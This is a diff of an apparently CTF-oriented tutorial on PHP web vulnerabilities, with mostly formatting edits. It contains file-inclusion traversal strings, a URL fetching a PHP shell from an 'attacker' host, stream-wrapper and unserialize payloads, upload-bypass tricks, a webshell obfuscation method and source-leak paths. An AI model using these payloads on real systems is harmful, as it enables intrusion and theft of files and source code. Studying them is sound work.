@@ -12,7 +12,7 @@ Common functions that cause files to be included are:
 
 When PHP includes a file, it will be executed as PHP code, regardless of the type of file.
 
-### Local file contains
+### A local file contains
 
 The local file contains, Local File Inclusion, LFI.
 
@@ -29,27 +29,27 @@ The above code has a local file containing, and the contents of the `/etc/passwd
 
 - `%00` truncation
 
-```
-?file=../../../../../../../../../etc/passwd%00
-```
+        ```text
+        ?file=../../../../../../../../../etc/passwd%00
+        ```
 
-Requires `magic_quotes_gpc=off`, PHP is less than 5.3.4.
+        Requires `magic_quotes_gpc=off`, PHP is less than 5.3.4.
 
 - Path length truncation
 
-```
-?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
-```
-
-Linux requires a file name longer than 4096 and Windows needs to be longer than 256.
+        ```text
+        ?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
+        ```
+        
+        Linux requires a file name longer than 4096 and Windows needs to be longer than 256.
 
 - Point number truncation
 
-```
-?file = ... / ... // ... // ... // ... / / boot.ini/ ……… [...] …………
-```
-
-For Windows only, the dot number needs to be longer than 256.
+        ```text
+        ?file = ... / ... // ... // ... // ... / / boot.ini/ ……… [...] …………
+        ```
+        
+        For Windows only, the dot number needs to be longer than 256.
 
 ### Remote file contains
 
@@ -67,7 +67,7 @@ The remote file contains, Remote File Inclusion, RFI.
 
 Constructs the value of the variable `basePath`.
 
-```
+```text
 /?basePath=http://attacker/phpshell.txt?
 ```
 
@@ -81,44 +81,45 @@ The part after the question mark is interpreted as the querystring of the URL, w
 
 - Normal remote file contains
 
-```
-?file=[http|https|ftp]://example.com/shell.txt
-```
-
-Need `allow_url_fopen=On` and `allow_url_include=On`.
+        ```text
+        ?file=[http|https|ftp]://example.com/shell.txt
+        ```
+        
+        Need `allow_url_fopen=On` and `allow_url_include=On`.
 
 - Utilize PHP stream input
-
-```
-?file=php://input
-```
-
-Need `allow_url_include=On`.
+        
+        ```
+        ?file=php://input
+        ```
+        
+        Need `allow_url_include=On`.
 
 - Utilize PHP stream filter
 
-```
-?file=php://filter/convert.base64-encode/resource=index.php
-```
-
-Need `allow_url_include=On`.
+        ```
+        ?file=php://filter/convert.base64-encode/resource=index.php
+        ```
+        
+        Need `allow_url_include=On`.
 
 - Use data URIs
 
-```
-?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
-```
-
-Need `allow_url_include=On`.
+        ```
+        ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
+        ```
+        
+        Need `allow_url_include=On`.
 
 - Execute with XSS
 
-```
-?file=http://127.0.0.1/path/xss.php?xss=phpcode
-```
-
-Need `allow_url_fopen=On`, `allow_url_include=On` and the firewall or whitelist is not allowed to access the external
-network, first find an XSS vulnerability in the same site, including this page, you can inject malicious code.
+        ```
+        ?file=http://127.0.0.1/path/xss.php?xss=phpcode
+        ```
+        
+        Need `allow_url_fopen=On`, `allow_url_include=On` and the firewall or whitelist is not allowed to access the 
+        external network, first find an XSS vulnerability in the same site, including this page, you can inject 
+        malicious code.
 
 ## File Upload
 
@@ -133,48 +134,48 @@ Content may cause the attack to fail.
 
 - Front end check extension
 
-Capture the package and bypass it.
+        Capture the package and bypass it.
 
 - `Content-Type` detection file type
 
-Capture the package to modify the `Content-Type` type to match the whitelist rules.
+        Capture the package to modify the `Content-Type` type to match the whitelist rules.
 
 - Add a suffix to the server
 
-Try `%00` truncation.
+        Try `%00` truncation.
 
 - Server extension detection
-
-Exploit the vulnerability.
+        
+        Exploit the vulnerability.
 
 - Apache parsing
-
-`phpshell.php.rar.rar.rar.rar` Because Apache does not know `.rar` this file type, so it will traverse the suffix to
-`.php`, and then think this is a PHP file.
+        
+        `phpshell.php.rar.rar.rar.rar` Because Apache does not know `.rar` this file type, so it will traverse the 
+        suffix to `.php`, and then think this is a PHP file.
 
 - IIS parsing
 
-When the file name is `abc.asp;xx.jpg` under IIS 6, it will be parsed as `abc.asp`.
+        When the file name is `abc.asp;xx.jpg` under IIS 6, it will be parsed as `abc.asp`.
 
 - PHP CGI path resolution
 
-When you visit `http://www.a.com/path/test.jpg/notexist.php`, `test.jpg` will be parsed as PHP, and `notexist.php` is a
-non-existent file. At this point, the configuration of Nginx is as follows
+        When you visit `http://www.a.com/path/test.jpg/notexist.php`, `test.jpg` will be parsed as PHP, and 
+        `notexist.php` is a non-existent file. At this point, the configuration of Nginx is as follows
 
-```nginx
-location ~ \.php$ {
-    root html;
-    fastcgi_pass 127.0.0.1:9000;
-    fastcgi_index index.php;
-    fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
-    include fastcgi_param;
-}
-```
+        ```nginx
+        location ~ \.php$ {
+            root html;
+            fastcgi_pass 127.0.0.1:9000;
+            fastcgi_index index.php;
+            fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
+            include fastcgi_param;
+        }
+        ```
 
 - other methods
 
-The suffix case, double write, special suffix such as `php5`, etc., modify the content of the package to the WAF and so
-on.
+        The suffix case, double write, special suffix such as `php5`, etc., modify the content of the package to the 
+        WAF and so on.
 
 ## Variable coverage
 
@@ -203,7 +204,7 @@ When `register_globals=ON`, submit `test.php?auth=1`, the `auth` variable will b
 
 The `extract()` function can import variables from an array into the current symbol table, which is defined as
 
-```
+```text
 int extract(array $var_array [, int $extract_type [, string $prefix ]] )
 ```
 
@@ -230,7 +231,7 @@ Variable coverage can occur when the `extract()` function exports variables from
 
 ### `import_request_variables` Variable Override
 
-```
+```text
 bool import_request_variables(string $types [, string $prefix])
 ```
 
@@ -254,7 +255,7 @@ coverage of `test.php?auth=1`.
 
 ### `parse_str()` variable override
 
-```
+```text
 void parse_str(string $str [, array &$arr ])
 ```
 
@@ -393,7 +394,7 @@ Let's analyze the above code together:
 Seeing this, I believe that if you see a similar `PHP` backdoor, you should not be so confused. You can use the sentence
 analysis of the backdoor code to understand the functions that the backdoor wants to achieve.
 
-We want to use this backdoor to create strings that bypass the detection and are useful to us, such as `_POST` ,
+We want to use this backdoor to create strings that bypass the detection and are useful to us, such as `_POST`,
 `system` , `call_user_func_array `, or whatever we need.
 
 Here is a very simple non-alphanumeric `PHP` backdoor:
@@ -414,7 +415,7 @@ Here I explain, `.=` is a string connection, see `PHP` syntax for details.
 
 We can even merge the above code into one line, making the program less readable, the code is as follows:
 
-```
+```php
 $__ = ("#" ^ "|") . ("." ^ "~") . ("/" ^ "`") . ("|" ^ "/") . ("{" ^ "/");
 ```
 
@@ -429,9 +430,9 @@ construct the following string:
 It may be that many small partners still can't understand how this string is constructed. Let's analyze the segment
 string.
 
-#### Construct `_GET` Read
+#### Construct `_GET` read
 
-First of all, we have to know what `X_GET` is from XOR. After my attempts and analysis, I came to the following
+First we have to know what `X_GET` is from XOR. After my attempts and analysis, I came to the following
 conclusion:
 
 ```php
@@ -441,7 +442,7 @@ conclusion:
 ```
 
 What is the meaning of this code? Because of the 40-character length limit, webshells that were previously
-XOR-to-character-spliced cannot be used. Here you can use the backquotes `` ` `` and `Linux` under the php php to
+XOR-to-character-spliced cannot be used. Here you can use the backquotes `` ` `` and `Linux` under the php to
 execute the command `?`
 
 - `?` means matching one character
@@ -562,7 +563,7 @@ controllable by the user.
 
 Attack payload
 
-```
+```text
 http://www.a.com/index.php?callback=phpinfo
 ```
 
@@ -584,7 +585,7 @@ If `unserialize()` defines a `__destruct()` or `__wakeup()` function at executio
 
 Attack payload
 
-```
+```text
 http://www.a.com/index.php?saved_code=O:7:"Example":1:{s:3:"var";s:10:"phpinfo();";}
 ```
 
@@ -688,7 +689,7 @@ The looseness of the built-in function is that when the function is called, the 
 that the function cannot accept. Explain a bit of a mouthful, or directly through the actual examples to illustrate the
 problem, the following will focus on a few of these functions.
 
-**md5()**
+#### md5()
 
 ```php
 $array1[] = array(
@@ -704,7 +705,7 @@ the requirement in `md5()` is a string type parameter. But when you pass an arra
 will not be able to correctly find the md5 value of the array, which will cause the md5 values of any 2 arrays to be
 equal.
 
-**strcmp()**
+#### strcmp()
 
 The `strcmp()` function is described in the official PHP manual as `intstrcmp(string $str1 , string $str2)`, which needs
 to pass 2 arguments of type `string` to `strcmp()`. If `str1` is less than `str2`, it returns -1, and equality returns
@@ -718,7 +719,7 @@ $array = [1,2,3];
 var_dump(strcmp($array, '123')); //null, in a sense null is equivalent to false.
 ```
 
-**switch()**
+#### switch()
 
 If `switch()` is a case of a numeric type, switch will convert the parameters to an int. as follows:
 
@@ -738,7 +739,7 @@ switch($i) {
 At this time, the program outputs `i is less than 3 but not negative` because the `switch()` function converts `$i` and
 the result is 2.
 
-**in_array()**
+#### in_array()
 
 In the PHP manual, the `in_array()` function is interpreted as
 `bool in_array(mixed $needle , array $haystack [, bool $strict = FALSE ])` . If the strict parameter is not provided,
@@ -746,11 +747,9 @@ then `in_array` will be loose. Compare to see if `$needle` is in `$haystack`. Wh
 `in_array()` compares the type of needls with the type in haystack.
 
 ```php
-
 $array = [0, 1, 2, '3'];
 var_dump(in_array('abc', $array)); //true
 var_dump(in_array('1bc', $array)); //true
-
 ```
 
 You can see that the above case returns true, because `'abc'` will be converted to 0, and `'1bc'` will be converted to
@@ -771,7 +770,7 @@ You can see that the above case returns true, because `'abc'` will be converted 
 The `.git` directory contains files such as code change records. If the files in this directory are accessible when
 deployed, they may be used to restore the source code.
 
-```
+```text
 /.git
 /.git/HEAD
 /.git/index
@@ -880,7 +879,7 @@ The administrator incorrectly placed the backup under the web directory after ba
 
 Common suffixes:
 
-```
+```text
 .rar
 .zip
 .7z
@@ -894,7 +893,7 @@ Common suffixes:
 
 Sensitive documents:
 
-```
+```text
 /.svn
 /.svn/wc.db
 /.svn/entries
@@ -936,9 +935,9 @@ Location ~ ^/WEB-INF/* { deny all; } # or return 404; or other!
 
 ### CVS Leak
 
-```
-Http://url/CVS/Root returns the root information
-Http://url/CVS/Entries returns the structure of all files
+```text
+http://url/CVS/Root returns the root information
+http://url/CVS/Entries returns the structure of all files
 ```
 
 Retrieve source code
